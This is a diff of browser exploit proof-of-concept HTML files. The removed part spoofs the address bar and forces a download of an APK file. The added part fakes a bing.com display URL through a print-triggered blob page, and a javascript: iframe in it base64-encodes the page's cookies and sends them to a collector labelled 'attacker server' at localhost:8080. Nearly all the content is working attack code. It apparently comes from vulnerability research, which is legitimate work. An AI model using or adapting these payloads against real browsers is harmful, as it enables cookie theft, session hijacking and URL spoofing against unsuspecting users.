@@ -1,31 +1,59 @@
-<META HTTP-EQUIV="refresh" CONTENT="0;url=index.htm">  <!-- if CONTENT >1 address bar will not dispaly chrome://newtab/ -->
-<iframe src="spoof.htm"></iframe>
-index.htm
-====================
-<script>
-setTimeout('sleep()',500);
-alert(1); //alert twice
-</script>
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+iframe { width:300px; height:300px; }
+</style>
+</head>
+<body>
+
+<textarea id="qd">
+<!DOCTYPE html>
+<html __IE_DisplayURL="https://www.bing.com/">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<base href="https://www.bing.com/">
+<style>
+html { font-family: "Times New Roman"; }
+iframe { width:300px; height:300px; }
+</style>
+</head>
+<body>
+
+<iframe id="qif" src="javascript:
+  var qa = top.document.createElement('img');
+  qa.src = 'http://localhost:8080/?' + encodeURIComponent(btoa(top.document.cookie));
+  top.document.body.appendChild(qa);
+  'just sent the following data to attacker server:<br>' + top.document.cookie;
+"></iframe>
+
+</body>
+</html>
+</textarea>
 
 <script>
-function sleep()
-{
-    document.write("123<br>");
+var qdiv = document.createElement('div');
+document.body.appendChild(qdiv);
 
-    var link = document.createElement("a");
-    link.href = "https://lowleveljody.github.io/pocbrowseraja/montero.apk";
-    link.download = "montero.apk";
-    document.body.appendChild(link);
-    link.click();
-    document.body.removeChild(link);
-}
+window.onbeforeprint = function () {
+  qdiv.innerHTML = `
+    <iframe src="javascript:
+      if (top.location.protocol == 'file:') {
+        setTimeout(function () {
+          top.location = URL.createObjectURL(
+            new Blob(
+              [top.document.getElementById('qd').value],
+              { type: 'text/html' }
+            )
+          );
+        }, 1000);
+      }
+    "></iframe>
+  `;
+};
 
+window.print();
 </script>
 
-spoof.htm
-===========
-<script>
-document.documentURI=eval();
-history.back(null)
-//debug alert(1)
-</script>
+</body>
+</html>
